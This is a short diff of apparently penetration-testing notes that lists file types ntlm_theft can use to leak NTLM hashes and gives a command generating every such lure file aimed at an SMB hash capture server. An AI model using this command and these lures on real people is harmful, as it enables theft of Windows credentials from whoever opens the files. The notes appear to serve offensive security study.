@@ -40,6 +40,11 @@ Open Document
 .m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)
 .jnlp – via Java external jar
 .application – via any Browser (Must be served via a browser downloaded or won’t run)
+.odt – OpenDocument Text
+Open Document and Accept Popup
+.pdf – via Adobe Acrobat Reader
+Click Link in Chat Program
+.txt – formatted link to paste into Zoom chat
 
 python3 ntlm_theft.py -g all -s 192.168.45.172(The IP address of your SMB hash capture server) -f contracts
 ```
